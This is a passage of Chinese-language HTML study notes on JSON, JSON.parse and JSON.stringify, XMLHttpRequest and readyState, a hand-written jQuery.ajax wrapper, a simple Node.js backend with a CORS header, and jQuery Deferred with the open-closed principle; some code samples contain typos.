就更不沾边了,只是 JS 的对象 */</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JSON</span></font></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var obj4 = {&quot;width&quot;:100, &quot;height&quot;:200, &quot;name&quot;:&quot;rose&quot;}; /* 我们可以把这个称做：JSON 格式的 JavaScript 对象 */</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">var str1 = '{&quot;width&quot;:100, &quot;height&quot;:200, &quot;name&quot;:&quot;rose&quot;}'; /* 我们可以把这个称做：JSON 格式的字符串 */</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">var a = [</font></div><div><font style="font-size: 12pt;">  {&quot;width&quot;:100, &quot;height&quot;:200, &quot;name&quot;:&quot;rose&quot;},</font></div><div><font style="font-size: 12pt;">  {&quot;width&quot;:100, &quot;height&quot;:200, &quot;name&quot;:&quot;rose&quot;},</font></div><div><font style="font-size: 12pt;">  {&quot;width&quot;:100, &quot;height&quot;:200, &quot;name&quot;:&quot;rose&quot;},</font></div><div><font style="font-size: 12pt;">];</font></div><div><font style="font-size: 12pt;">/* 这个叫 JSON 格式的数组，是 JSON 的稍复杂一点的形式 */</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">var str2 = '[' +</font></div><div><font style="font-size: 12pt;">'{&quot;width&quot;:100,&quot;height&quot;:200,&quot;name&quot;:&quot;rose&quot;},' +</font></div><div><font style="font-size: 12pt;">'{&quot;width&quot;:100,&quot;height&quot;:200,&quot;name&quot;:&quot;rose&quot;},' +</font></div><div><font style="font-size: 12pt;">'{&quot;width&quot;:100,&quot;height&quot;:200,&quot;name&quot;:&quot;rose&quot;},' +</font></div><div><font style="font-size: 12pt;">']';</font></div><div><font style="font-size: 12pt;">/* 这个叫稍复杂一点的 JSON 格式的字符串 */</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">JSON 表示的基本类型：字符串、数值、布尔值 、 null</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">JSON 表示的引用类型：对象 和 </span><span style="font-size: 12pt;">数组</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">JSON 可以</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">返回</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">大量不同的响应结果，比如某某参数错误，而不用字符串大量人工判断返回错误。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JSON 和 JS 对象互转</span></font></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">要实现从 JSON 字符串 转换为 JS 对象，使用 JSON.parse() 反序列化方法：</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">var obj = JSON.parse('{&quot;a&quot;: &quot;Hello&quot;, &quot;b&quot;: &quot;World&quot;}'); // 结果是 {a: &quot;Hello&quot;, b: &quot;World&quot;}</font></div></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">要实现从 JS 对象 转换为 JSON 字符串，使用 JSON.stringify() 序列化方法：</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">var json = JSON.stringify({a: 'Hello', b: 'World'}); // 结果是 '{&quot;a&quot;: &quot;Hello&quot;, &quot;b&quot;: &quot;World&quot;}'</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON.stringify() 序列化 JS 对象时，所有函数和原型成员、值为 undefined 的属性都会被忽略</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON.stringify() 默认情况下输出的 JSON 字符串不包含任何空格或缩进</span></font></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON.stringify() 还有另外两个参数，第一个参数是过滤器（可以是一个数组或函数），第二个参数是选项（表示是否在JSON字符串中保持缩进）</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><hr/><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">AJAX 其实现在的真名是 AJAJ</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">myButton.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    let request = new XMLHttpRequest();</font></div><div><font style="font-size: 12pt;">    request.open('GET', 'http://jack.com:8002/xxx'); // 配置request       </font></div><div><font style="font-size: 12pt;">    request.send();</font></div><div><font style="font-size: 12pt;">    request.onreadystatechange = () =&gt; {</font></div><div><font style="font-size: 12pt;">        if (request.readyState === 4) {</font></div><div><font style="font-size: 12pt;">            if (request.status &gt;= 200 &amp;&amp; request.status &lt; 300){</font></div><div><font style="font-size: 12pt;">                let string = request.responseText;</font></div><div><font style="font-size: 12pt;">                let object = window.JSON.parse(string)</font></div><div><font style="font-size: 12pt;">            }</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    };</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; font-weight: bold;">前端使用 AJAX 设置任意请求 header</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">request.open('GET', '/xxx');             </span><span style="font-size: 12pt;">// 设置请求头的第一部分</span></div><div><span style="font-size: 12pt;">request.setRequestHeader('frank'，'18');                            // 设置请求头的第二部分</span></div><div><span style="font-size: 12pt;">request.setRequestHeader('Content-Type'，'x-www-form-urlencoded'); </span> <span style="font-size: 12pt;">// 设置请求头的第二部分</span></div><div><span style="font-size: 12pt;">request.send('我偏要设置request第四部分') </span><span style="font-size: 12pt;">// 设置请求的第四部分（</span><span style="font-size: 12pt;">GET请求看不到，POST请求可以）</span></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [69].jpg" type="image/jpeg" data-filename="3.jpg" width="1158"/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">第三个 setRequestHeader 是为了告诉服务器，要发送的是表单数据（一定要写在中间）</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">前端使用 AJAX 获取后端任意响应 header（服务器Node.js可以设置</span><span style="font-size: 12pt; font-weight: bold;">响应 header</span><span style="font-size: 12pt; font-weight: bold;">）</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [70].jpg" type="image/jpeg" data-filename="3.jpg" width="678"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">console.log(request.status)      // </span><span style="font-size: 12pt;">获取响应第一部分的</span><span style="font-size: 12pt;"> 状态码 如200</span></div><div><span style="font-size: 12pt;">console.log(request.statusText)  // </span><span style="font-size: 12pt;">获取响应第一部分的</span> <span style="font-size: 12pt;"> 状态码信息 如ok</span></div><div><span style="font-size: 12pt;">console.log(request.getAllResponseHeader('Content-Type')) // 获取响应第二部分的特定值</span></div><div><span style="font-size: 12pt;">console.log(request.getAllResponseHeaders())              // 获取所有响应的第二部分</span></div><div><span style="font-size: 12pt;">console.log(request.resonseText) // 获取所有响应的第四部分</span></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; font-weight: bold;">readystate 属性表示的请求状态：</span></div><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"></col><col style="width: 189px;"></col><col style="width: 616px;"></col></colgroup><tbody><tr><td style="width: 130px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">值</span></div></td><td style="width: 189px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">状态</span></div></td><td style="width: 616px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">描述</span></div></td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">0</span></div></td><td style="width: 189px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">UNSENT</span></div></td><td style="width: 616px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">客户端创建了XHR对象，但尚未调用 open() 方法。</span></div></td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">1</span></div></td><td style="width: 189px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">OPENED</span></div></td><td style="width: 616px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">服务器连接已建立，open() 方法已经被调用。</span></div></td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid;"><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">2</span></div></td><td style="width: 189px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">HEADERS_RECEIVED</span></div></td><td style="width: 616px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">send() 方法已经被调用，并且响应头和响应状态已返回。</span><span style="font-size: 12pt;">（响应的第一部分）</span></div></td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">3</span></div></td><td style="width: 189px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">LOADING</span></div></td><td style="width: 616px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">响应体下载中； responseText 属性已经包含部分数据。（响应的第四部分）</span></div></td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">4</span></div></td><td style="width: 189px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">DONE</span></div></td><td style="width: 616px; padding: 8px; border: 1px solid;"><div><span style="font-size: 12pt;">整个响应下载已完成，</span><span style="font-size: 12pt;">请求完毕</span><span style="font-size: 12pt;">。</span></div></td></tr></tbody></table><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">onreadystatechange可以捕捉readystate属性值的变化</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">TCP三次握手、四次挥手、DNS查询</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [71].jpg" type="image/jpeg" data-filename="3.jpg" width="1103"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><span style="font-size: 12pt; font-weight: bold;">jQuery 的 AJAX</span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [72].jpg" type="image/jpeg" data-filename="3.jpg" width="666"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">$(document).ready(function () {</font></div><div><font style="font-size: 12pt;">    $(&quot;#search&quot;).click(function () {</font></div><div><font style="font-size: 12pt;">        $.ajax({</font></div><div><font style="font-size: 12pt;">            type: &quot;GET&quot;,</font></div><div><font style="font-size: 12pt;">            url: &quot;http://127.0.0.1:8080/ajaxdemo/serverjson2.php?number=&quot; + $(&quot;#keyword&quot;).val(),</font></div><div><font style="font-size: 12pt;">            dataType: &quot;json&quot;,</font></div><div><font style="font-size: 12pt;">            success: function (data) {</font></div><div><font style="font-size: 12pt;">                if (data.success) {</font></div><div><font style="font-size: 12pt;">                    $(&quot;#searchResult&quot;).html(data.msg);</font></div><div><font style="font-size: 12pt;">                } else {</font></div><div><font style="font-size: 12pt;">                    $(&quot;#searchResult&quot;).html(&quot;出现错误：&quot; + data.msg);</font></div><div><font style="font-size: 12pt;">                }</font></div><div><font style="font-size: 12pt;">            },</font></div><div><font style="font-size: 12pt;">            error: function (jqXHR) {</font></div><div><font style="font-size: 12pt;">                alert(&quot;发生错误：&quot; + jqXHR.status);</font></div><div><font style="font-size: 12pt;">            },</font></div><div><font style="font-size: 12pt;">        });</font></div><div><font style="font-size: 12pt;">    });</font></div><div><font style="font-size: 12pt;">    $(&quot;#save&quot;).click(function () {</font></div><div><font style="font-size: 12pt;">        $.ajax({</font></div><div><font style="font-size: 12pt;">            type: &quot;POST&quot;,</font></div><div><font style="font-size: 12pt;">            url: &quot;serverjson.php&quot;,</font></div><div><font style="font-size: 12pt;">            data: {</font></div><div><font style="font-size: 12pt;">                name: $(&quot;#staffName&quot;).val(),</font></div><div><font style="font-size: 12pt;">                number: $(&quot;#staffNumber&quot;).val(),</font></div><div><font style="font-size: 12pt;">                sex: $(&quot;#staffSex&quot;).val(),</font></div><div><font style="font-size: 12pt;">                job: $(&quot;#staffJob&quot;).val()</font></div><div><font style="font-size: 12pt;">            },</font></div><div><font style="font-size: 12pt;">            dataType: &quot;json&quot;,</font></div><div><font style="font-size: 12pt;">            success: function (data) {</font></div><div><font style="font-size: 12pt;">                if (data.success) {</font></div><div><font style="font-size: 12pt;">                    $(&quot;#createResult&quot;).html(data.msg);</font></div><div><font style="font-size: 12pt;">                } else {</font></div><div><font style="font-size: 12pt;">                    $(&quot;#createResult&quot;).html(&quot;出现错误：&quot; + data.msg);</font></div><div><font style="font-size: 12pt;">                }</font></div><div><font style="font-size: 12pt;">            },</font></div><div><font style="font-size: 12pt;">            error: function (jqXHR) {</font></div><div><font style="font-size: 12pt;">                alert(&quot;发生错误：&quot; + jqXHR.status);</font></div><div><font style="font-size: 12pt;">            },</font></div><div><font style="font-size: 12pt;">        });</font></div><div><font style="font-size: 12pt;">    });</font></div><div><font style="font-size: 12pt;">});</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">jQuery 的 AJAX（简单版）</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">window.jQuery.ajax = function (url, method, body, successFn, failFn) {</font></div><div><font style="font-size: 12pt;">      let request = new XMLHttprequest();</font></div><div><font style="font-size: 12pt;">      request.open(method, url);</font></div><div><font style="font-size: 12pt;">      request.send(body);</font></div><div><font style="font-size: 12pt;">      request.onreadystateChange = () =&gt; {</font></div><div><font style="font-size: 12pt;">          if (request.readyState === 4) {</font></div><div><font style="font-size: 12pt;">              if (request.status &gt;= 200 &amp;&amp; request.status &lt; 300) {</font></div><div><font style="font-size: 12pt;">                  successFn.call(undefined, request.responseText);</font></div><div><font style="font-size: 12pt;">              }</font></div><div><font style="font-size: 12pt;">              else if (request.status &gt;= 400) {</font></div><div><font style="font-size: 12pt;">                  failFn.call(undefined, request);</font></div><div><font style="font-size: 12pt;">              }</font></div><div><font style="font-size: 12pt;">         }</font></div><div><font style="font-size: 12pt;">     }</font></div><div><font style="font-size: 12pt;">};</font></div><div><font style="font-size: 12pt;">window.$ = window.jQuery;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">myButton.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    window.jQuery.ajax(</font></div><div><font style="font-size: 12pt;">        '/xxx',</font></div><div><font style="font-size: 12pt;">        'POST',</font></div><div><font style="font-size: 12pt;">        'a=1&amp;b=2',</font></div><div><font style="font-size: 12pt;">        (responseText) =&gt; { console.log(1) },</font></div><div><font style="font-size: 12pt;">        (request) =&gt; { console.log(2) }</font></div><div><font style="font-size: 12pt;">    );</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">jQuery 的 AJAX（优化版）</span></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">前端frank.com代码</span></font></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">window.jQuery.ajax = function (options) {</font></div><div><font style="font-size: 12pt;">     let url;</font></div><div><font style="font-size: 12pt;">     // 一个函数接受两种参数</font></div><div><font style="font-size: 12pt;">     if (arguments.length === 0) {</font></div><div><font style="font-size: 12pt;">         url = options.url;</font></div><div><font style="font-size: 12pt;">     }</font></div><div><font style="font-size: 12pt;">     else if (aarguments.length === 2) {</font></div><div><font style="font-size: 12pt;">         url = arguments[0];</font></div><div><font style="font-size: 12pt;">         options = arguments[1];</font></div><div><font style="font-size: 12pt;">     }</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">     let method = options.method;</font></div><div><font style="font-size: 12pt;">     let body = options.body;</font></div><div><font style="font-size: 12pt;">     let successFn = opitons.successFn;</font></div><div><font style="font-size: 12pt;">     let failFn = options.failFn;</font></div><div><font style="font-size: 12pt;">     let headers = oprions.headers;</font></div><div><font style="font-size: 12pt;">     // ES6 函数的解构赋值</font></div><div><font style="font-size: 12pt;"><font>     // </font>let {method, body, successFn, failFn, headers} = options; </font></div><div><br/></div><div><font style="font-size: 12pt;">     let request = new XMLHttprequest();</font></div><div><font style="font-size: 12pt;">     request.open(method, url);</font></div><div><font style="font-size: 12pt;">     for (let key in headers) {</font></div><div><font style="font-size: 12pt;">         let value = headers[key];</font></div><div><font style="font-size: 12pt;">         request.setRequestHeader(key, value);  </font></div><div><font style="font-size: 12pt;">     } </font></div><div><font style="font-size: 12pt;">     request.send(body);</font></div><div><font style="font-size: 12pt;">     request.onreadystateChange = () =&gt; {</font></div><div><font style="font-size: 12pt;">         if (request.readyState === 4) {</font></div><div><font style="font-size: 12pt;">             if (request.status &gt;= 200 &amp;&amp; request.status &lt; 300) {</font></div><div><font style="font-size: 12pt;">                 successFn.call(undefined, request.responseText);</font></div><div><font style="font-size: 12pt;">             }</font></div><div><font style="font-size: 12pt;">             else if (request.status &gt;= 400) {</font></div><div><font style="font-size: 12pt;">                 failFn.call(undefined, request);</font></div><div><font style="font-size: 12pt;">             }</font></div><div><font style="font-size: 12pt;">         }</font></div><div><font style="font-size: 12pt;">     }</font></div><div><font style="font-size: 12pt;">};</font></div><div><font style="font-size: 12pt;">window.$ = window.jQuery;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">function f1(responseText) {};</font></div><div><font style="font-size: 12pt;">function f2(responseText) {};</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">myButton.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    window.jQuery.ajax({</font></div><div><font style="font-size: 12pt;">        url: '/xxx',</font></div><div><font style="font-size: 12pt;">        method: 'GET',</font></div><div><font style="font-size: 12pt;">        headers : {</font></div><div><font style="font-size: 12pt;">            'content-type': 'application/x-www-form-m-urlencoded',</font></div><div><font style="font-size: 12pt;">            'frank': '18'      </font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">        successFn: (x) =&gt; {</font></div><div><font style="font-size: 12pt;">           f1.call(undefined, x);  // x是request.responseText 使用方自己定义了函数参数不callbu，让别人call，也就是回调      </font></div><div><font style="font-size: 12pt;"><font>           </font>f2.call(undefined, x); <font> </font></font></div><div><font style="font-size: 12pt;">        },</font></div><div><font style="font-size: 12pt;">        failFn: (x) =&gt; {</font></div><div><font style="font-size: 12pt;">            console.log(x.staus);      // x是request</font></div><div><font style="font-size: 12pt;">            console.log(x.resonseText) // 即使是404还是会返回响应体</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    });</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">后端jack.com代码</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">else if (path === '/xxx') {</font></div><div><font style="font-size: 12pt;">    response.statusCode = 200;</font></div><div><font style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/json;charset=utf-8');</font></div><div><font style="font-size: 12pt;">    response.setHeader('Access-Control-Allow-Origin', 'http://frank.com:8001');</font></div><div><font style="font-size: 12pt;">    response.write(`</font></div><div><font style="font-size: 12pt;">        {</font></div><div><font style="font-size: 12pt;">            &quot;note&quot;: {</font></div><div><font style="font-size: 12pt;">                &quot;to&quot;: &quot;小谷&quot;,</font></div><div><font style="font-size: 12pt;">                &quot;from&quot;: &quot;方方&quot;,</font></div><div><font style="font-size: 12pt;">                &quot;heading&quot;: &quot;打招呼&quot;,</font></div><div><font style="font-size: 12pt;">                &quot;content&quot;: &quot;hi&quot;</font></div><div><font style="font-size: 12pt;">            }</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    `);</font></div><div><font style="font-size: 12pt;">    response.end();</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;">else {</font></div><div><font style="font-size: 12pt;">    response.statusCode = 404;</font></div><div><font style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/html;charset=utf8');</font></div><div><font style="font-size: 12pt;">    response.write(`{</font></div><div><font style="font-size: 12pt;">        &quot;error&quot;: &quot;not found&quot;</font></div><div><font style="font-size: 12pt;">    }`)</font></div><div><font style="font-size: 12pt;">    response.end();</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [73].jpg" type="image/jpeg" data-filename="3.jpg" width="257"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [74].jpg" type="image/jpeg" data-filename="3.jpg" width="1227"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [75].jpg" type="image/jpeg" data-filename="3.jpg" width="1226"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [76].jpg" type="image/jpeg" data-filename="3.jpg" width="562"/></span></div><div><br/></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><span style="font-size: 12pt; font-weight: bold;">jQuery Deffered</span></div><div><br/></div><div><span style="font-size: 12pt;">callback 形式（</span><span style="font-size: 12pt;">success 和 error</span><span style="font-size: 12pt;">）</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [77].jpg" type="image/jpeg" data-filename="3.jpg" width="662"/></div><div><span style="font-size: 12pt;">1.5 之后将 success 和 error 各自拆分为 .done() .fail()，符合开放封闭原则</span><span style="font-size: 12pt;">（对扩展开放，对修改封闭）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [78].jpg" type="image/jpeg" data-filename="3.jpg" width="753"/></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">将一次的 success 和 error 放在一个 .then() 里</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [79].jpg" type="image/jpeg" data-filename="3.jpg" width="583"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [80].jpg" type="image/jpeg" data-filename="3.jpg" width="723"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [81].jpg" type="image/jpeg" data-filename="3.jpg" width="364"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [82].jpg" type="image/jpeg" data-filename="3.jpg" width="533"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [83].jpg" type="image/jpeg" data-filename="3.jpg" width="351"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [84].jpg" type="image/jpeg" data-filename="3.jpg" width="534"/></div><div><br/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [85].jpg" type="image/jpeg" data-filename="3.jpg" width="968"/></div><div><br/></div><div><span style="font-size: 12pt;">如果</span><span style="font-size: 12pt;">没有地方扩展，</span><span style="font-size: 12pt;">直接修改函数体代码（对修改开放，对扩展封闭）</span></div><div><br/></div><div><span style="font-size: 12pt;">如果可以扩展，多人协作时，一个人负责一个函数，</span><span style="font-size: 12pt;">只需再加一个函数即可，</span><span style="font-size: 12pt;">无需修改别人的代码，而且测试只测试扩展的代码不用测试以前的代码，减少回归测试成本。</span></div><div><br/></div><div><span style="font-size: 12pt;">这个复杂的操作（1000 行）如果在 task 函数体里写，这违反了开放封闭原则（对扩展开放，对修改封闭），以后修改时也麻烦</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [86].jpg" type="image/jpeg" data-filename="3.jpg" width="748"/></div><div><br/></div><div><span style="font-size: 12pt;">上面代码中有三个 function，两个 return，异步任务执行 2 秒后打印执行完成，dtd.resolve() 表示异步任务已经完成后，最终返回 dtd 对象</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [87].jpg" type="image/jpeg" data-filename="3.jpg" width="525"/></div><div><br/></div><div><span style="font-size: 12pt;">dtd.resolve() 后主动触发异步任务已经完成，把 dtd 对象赋给变量 w，w 监听到 resolve() 后执行 .then() 成功的回调：打印 ok 1 和 ok 2</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [88].jpg" type="image/jpeg" data-filename="3.jpg" width="349"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [89].jpg" type="image/jpeg" data-filename="3.jpg" width="367"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [90].jpg" type="image/jpeg" data-filename="3.jpg" width="344"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [91].jpg" type="image/jpeg" data-filename="3.jpg" width="529"/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">dtd.resolve() 后复杂代码操作从此不用写在函数体里，而是将复杂代码操作放在 .then() 方法扩展，符合开放封闭原则</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（对扩展开放，对修改封闭）</span></div><div><br/></div><div><span 